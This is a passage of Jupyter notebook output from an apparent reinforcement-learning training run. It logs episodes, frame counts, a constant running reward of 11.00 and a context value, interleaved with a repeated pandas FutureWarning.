    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 524\t Frame count: 299400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 524\t Frame count: 299500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 524\t Frame count: 299600\t Context: 1\n",
      "Running reward: 11.00\t Episode 524\t Frame count: 299700\t Context: 2\n",
      "Running reward: 11.00\t Episode 524\t Frame count: 299800\t Context: 2\n",
      "Running reward: 11.00\t Episode 524\t Frame count: 299900\t Context: 2\n",
      "Running reward: 11.00\t Episode 525\t Frame count: 300000\t Context: 1\n",
      "Running reward: 11.00\t Episode 525\t Frame count: 300100\t Context: 1\n",
      "Running reward: 11.00\t Episode 525\t Frame count: 300200\t Context: 1\n",
      "Running reward: 11.00\t Episode 525\t Frame count: 300300\t Context: 1\n",
      "Running reward: 11.00\t Episode 525\t Frame count: 300400\t Context: 2\n",
      "Running reward: 11.00\t Episode 525\t Frame count: 300500\t Context: 2\n",
      "Running reward: 11.00\t Episode 525\t Frame count: 300600\t Context: 2\n",
      "Running reward: 11.00\t Episode 525\t Frame count: 300700\t Context: 2\n",
      "Running reward: 11.00\t Episode 525\t Frame count: 300800\t Context: 2\n",
      "Running reward: 11.00\t Episode 525\t Frame count: 300900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 526\t Frame count: 301000\t Context: 1\n",
      "Running reward: 11.00\t Episode 526\t Frame count: 301100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 526\t Frame count: 301200\t Context: 1\n",
      "Running reward: 11.00\t Episode 526\t Frame count: 301300\t Context: 1\n",
      "Running reward: 11.00\t Episode 526\t Frame count: 301400\t Context: 1\n",
      "Running reward: 11.00\t Episode 526\t Frame count: 301500\t Context: 1\n",
      "Running reward: 11.00\t Episode 526\t Frame count: 301600\t Context: 2\n",
      "Running reward: 11.00\t Episode 526\t Frame count: 301700\t Context: 2\n",
      "Running reward: 11.00\t Episode 526\t Frame count: 301800\t Context: 2\n",
      "Running reward: 11.00\t Episode 527\t Frame count: 301900\t Context: 2\n",
      "Running reward: 11.00\t Episode 527\t Frame count: 302000\t Context: 2\n",
      "Running reward: 11.00\t Episode 527\t Frame count: 302100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 527\t Frame count: 302200\t Context: 2\n",
      "Running reward: 11.00\t Episode 527\t Frame count: 302300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 527\t Frame count: 302400\t Context: 2\n",
      "Running reward: 11.00\t Episode 528\t Frame count: 302500\t Context: 2\n",
      "Running reward: 11.00\t Episode 528\t Frame count: 302600\t Context: 2\n",
      "Running reward: 11.00\t Episode 529\t Frame count: 302700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 529\t Frame count: 302800\t Context: 1\n",
      "Running reward: 11.00\t Episode 529\t Frame count: 302900\t Context: 2\n",
      "Running reward: 11.00\t Episode 529\t Frame count: 303000\t Context: 2\n",
      "Running reward: 11.00\t Episode 530\t Frame count: 303100\t Context: 1\n",
      "Running reward: 11.00\t Episode 530\t Frame count: 303200\t Context: 2\n",
      "Running reward: 11.00\t Episode 530\t Frame count: 303300\t Context: 2\n",
      "Running reward: 11.00\t Episode 530\t Frame count: 303400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 530\t Frame count: 303500\t Context: 2\n",
      "Running reward: 11.00\t Episode 530\t Frame count: 303600\t Context: 2\n",
      "Running reward: 11.00\t Episode 530\t Frame count: 303700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 530\t Frame count: 303800\t Context: 2\n",
      "Running reward: 11.00\t Episode 530\t Frame count: 303900\t Context: 2\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 304000\t Context: 1\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 304100\t Context: 1\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 304200\t Context: 2\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 304300\t Context: 2\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 304400\t Context: 2\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 304500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 531\t Frame count: 304600\t Context: 2\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 304700\t Context: 2\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 304800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 531\t Frame count: 304900\t Context: 2\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 305000\t Context: 2\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 305100\t Context: 2\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 305200\t Context: 2\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 305300\t Context: 2\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 305400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 531\t Frame count: 305500\t Context: 2\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 305600\t Context: 2\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 305700\t Context: 2\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 305800\t Context: 2\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 305900\t Context: 2\n",
      "Running reward: 11.00\t Episode 531\t Frame count: 306000\t Context: 2\n",
      "Running reward: 11.00\t Episode 532\t Frame count: 306100\t Context: 1\n",
      "Running reward: 11.00\t Episode 532\t Frame count: 306200\t Context: 1\n",
      "Running reward: 11.00\t Episode 532\t Frame count: 306300\t Context: 1\n",
      "Running reward: 11.00\t Episode 532\t Frame count: 306400\t Context: 1\n",
      "Running reward: 11.00\t Episode 532\t Frame count: 306500\t Context: 2\n",
      "Running reward: 11.00\t Episode 532\t Frame count: 306600\t Context: 2\n",
      "Running reward: 11.00\t Episode 532\t Frame count: 306700\t Context: 2\n",
      "Running reward: 11.00\t Episode 532\t Frame count: 306800\t Context: 2\n",
      "Running reward: 11.00\t Episode 533\t Frame count: 306900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 533\t Frame count: 307000\t Context: 1\n",
      "Running reward: 11.00\t Episode 533\t Frame count: 307100\t Context: 2\n",
      "Running reward: 11.00\t Episode 533\t Frame count: 307200\t Context: 2\n",
      "Running reward: 11.00\t Episode 533\t Frame count: 307300\t Context: 2\n",
      "Running reward: 11.00\t Episode 533\t Frame count: 307400\t Context: 2\n",
      "Running reward: 11.00\t Episode 534\t Frame count: 307500\t Context: 1\n",
      "Running reward: 11.00\t Episode 534\t Frame count: 307600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 534\t Frame count: 307700\t Context: 1\n",
      "Running reward: 11.00\t Episode 534\t Frame count: 307800\t Context: 1\n",
      "Running reward: 11.00\t Episode 534\t Frame count: 307900\t Context: 2\n",
      "Running reward: 11.00\t Episode 534\t Frame count: 308000\t Context: 2\n",
      "Running reward: 11.00\t Episode 534\t Frame count: 308100\t Context: 2\n",
      "Running reward: 11.00\t Episode 534\t Frame count: 308200\t Context: 2\n",
      "Running reward: 11.00\t Episode 534\t Frame count: 308300\t Context: 2\n",
      "Running reward: 11.00\t Episode 534\t Frame count: 308400\t Context: 2\n",
      "Running reward: 11.00\t Episode 534\t Frame count: 308500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 534\t Frame count: 308600\t Context: 2\n",
      "Running reward: 11.00\t Episode 534\t Frame count: 308700\t Context: 2\n",
      "Running reward: 11.00\t Episode 534\t Frame count: 308800\t Context: 2\n",
      "Running reward: 11.00\t Episode 534\t Frame count: 308900\t Context: 2\n",
      "Running reward: 11.00\t Episode 534\t Frame count: 309000\t Context: 2\n",
      "Running reward: 11.00\t Episode 535\t Frame count: 309100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 535\t Frame count: 309200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 535\t Frame count: 309300\t Context: 1\n",
      "Running reward: 11.00\t Episode 535\t Frame count: 309400\t Context: 1\n",
      "Running reward: 11.00\t Episode 535\t Frame count: 309500\t Context: 1\n",
      "Running reward: 11.00\t Episode 535\t Frame count: 309600\t Context: 1\n",
      "Running reward: 11.00\t Episode 535\t Frame count: 309700\t Context: 1\n",
      "Running reward: 11.00\t Episode 535\t Frame count: 309800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 535\t Frame count: 309900\t Context: 1\n",
      "Running reward: 11.00\t Episode 535\t Frame count: 310000\t Context: 1\n",
      "Running reward: 11.00\t Episode 535\t Frame count: 310100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 535\t Frame count: 310200\t Context: 2\n",
      "Running reward: 11.00\t Episode 535\t Frame count: 310300\t Context: 2\n",
      "Running reward: 11.00\t Episode 535\t Frame count: 310400\t Context: 2\n",
      "Running reward: 11.00\t Episode 536\t Frame count: 310500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 536\t Frame count: 310600\t Context: 1\n",
      "Running reward: 11.00\t Episode 536\t Frame count: 310700\t Context: 2\n",
      "Running reward: 11.00\t Episode 536\t Frame count: 310800\t Context: 2\n",
      "Running reward: 11.00\t Episode 536\t Frame count: 310900\t Context: 2\n",
      "Running reward: 11.00\t Episode 537\t Frame count: 311000\t Context: 1\n",
      "Running reward: 11.00\t Episode 537\t Frame count: 311100\t Context: 1\n",
      "Running reward: 11.00\t Episode 537\t Frame count: 311200\t Context: 1\n",
      "Running reward: 11.00\t Episode 537\t Frame count: 311300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 537\t Frame count: 311400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 537\t Frame count: 311500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 537\t Frame count: 311600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 537\t Frame count: 311700\t Context: 1\n",
      "Running reward: 11.00\t Episode 537\t Frame count: 311800\t Context: 2\n",
      "Running reward: 11.00\t Episode 537\t Frame count: 311900\t Context: 2\n",
      "Running reward: 11.00\t Episode 538\t Frame count: 312000\t Context: 2\n",
      "Running reward: 11.00\t Episode 538\t Frame count: 312100\t Context: 2\n",
      "Running reward: 11.00\t Episode 539\t Frame count: 312200\t Context: 2\n",
      "Running reward: 11.00\t Episode 539\t Frame count: 312300\t Context: 2\n",
      "Running reward: 11.00\t Episode 539\t Frame count: 312400\t Context: 2\n",
      "Running reward: 11.00\t Episode 539\t Frame count: 312500\t Context: 2\n",
      "Running reward: 11.00\t Episode 540\t Frame count: 312600\t Context: 2\n",
      "Running reward: 11.00\t Episode 541\t Frame count: 312700\t Context: 1\n",
      "Running reward: 11.00\t Episode 541\t Frame count: 312800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 541\t Frame count: 312900\t Context: 1\n",
      "Running reward: 11.00\t Episode 541\t Frame count: 313000\t Context: 2\n",
      "Running reward: 11.00\t Episode 542\t Frame count: 313100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 543\t Frame count: 313200\t Context: 1\n",
      "Running reward: 11.00\t Episode 543\t Frame count: 313300\t Context: 1\n",
      "Running reward: 11.00\t Episode 543\t Frame count: 313400\t Context: 1\n",
      "Running reward: 11.00\t Episode 543\t Frame count: 313500\t Context: 1\n",
      "Running reward: 11.00\t Episode 544\t Frame count: 313600\t Context: 1\n",
      "Running reward: 11.00\t Episode 544\t Frame count: 313700\t Context: 1\n",
      "Running reward: 11.00\t Episode 544\t Frame count: 313800\t Context: 1\n",
      "Running reward: 11.00\t Episode 544\t Frame count: 313900\t Context: 2\n",
      "Running reward: 11.00\t Episode 545\t Frame count: 314000\t Context: 1\n",
      "Running reward: 11.00\t Episode 545\t Frame count: 314100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 546\t Frame count: 314200\t Context: 1\n",
      "Running reward: 11.00\t Episode 546\t Frame count: 314300\t Context: 1\n",
      "Running reward: 11.00\t Episode 546\t Frame count: 314400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 546\t Frame count: 314500\t Context: 1\n",
      "Running reward: 11.00\t Episode 546\t Frame count: 314600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 546\t Frame count: 314700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 546\t Frame count: 314800\t Context: 2\n",
      "Running reward: 11.00\t Episode 546\t Frame count: 314900\t Context: 2\n",
      "Running reward: 11.00\t Episode 547\t Frame count: 315000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 547\t Frame count: 315100\t Context: 1\n",
      "Running reward: 11.00\t Episode 547\t Frame count: 315200\t Context: 1\n",
      "Running reward: 11.00\t Episode 547\t Frame count: 315300\t Context: 1\n",
      "Running reward: 11.00\t Episode 547\t Frame count: 315400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 548\t Frame count: 315500\t Context: 1\n",
      "Running reward: 11.00\t Episode 548\t Frame count: 315600\t Context: 1\n",
      "Running reward: 11.00\t Episode 548\t Frame count: 315700\t Context: 1\n",
      "Running reward: 11.00\t Episode 548\t Frame count: 315800\t Context: 1\n",
      "Running reward: 11.00\t Episode 548\t Frame count: 315900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 548\t Frame count: 316000\t Context: 2\n",
      "Running reward: 11.00\t Episode 549\t Frame count: 316100\t Context: 1\n",
      "Running reward: 11.00\t Episode 549\t Frame count: 316200\t Context: 1\n",
      "Running reward: 11.00\t Episode 549\t Frame count: 316300\t Context: 1\n",
      "Running reward: 11.00\t Episode 549\t Frame count: 316400\t Context: 2\n",
      "Running reward: 11.00\t Episode 550\t Frame count: 316500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 550\t Frame count: 316600\t Context: 1\n",
      "Running reward: 11.00\t Episode 550\t Frame count: 316700\t Context: 1\n",
      "Running reward: 11.00\t Episode 550\t Frame count: 316800\t Context: 1\n",
      "Running reward: 11.00\t Episode 550\t Frame count: 316900\t Context: 1\n",
      "Running reward: 11.00\t Episode 550\t Frame count: 317000\t Context: 1\n",
      "Running reward: 11.00\t Episode 550\t Frame count: 317100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 550\t Frame count: 317200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 550\t Frame count: 317300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 550\t Frame count: 317400\t Context: 1\n",
      "Running reward: 11.00\t Episode 550\t Frame count: 317500\t Context: 1\n",
      "Running reward: 11.00\t Episode 550\t Frame count: 317600\t Context: 1\n",
      "Running reward: 11.00\t Episode 550\t Frame count: 317700\t Context: 1\n",
      "Running reward: 11.00\t Episode 550\t Frame count: 317800\t Context: 1\n",
      "Running reward: 11.00\t Episode 550\t Frame count: 317900\t Context: 1\n",
      "Running reward: 11.00\t Episode 550\t Frame count: 318000\t Context: 2\n",
      "Running reward: 11.00\t Episode 550\t Frame count: 318100\t Context: 2\n",
      "Running reward: 11.00\t Episode 551\t Frame count: 318200\t Context: 1\n",
      "Running reward: 11.00\t Episode 551\t Frame count: 318300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
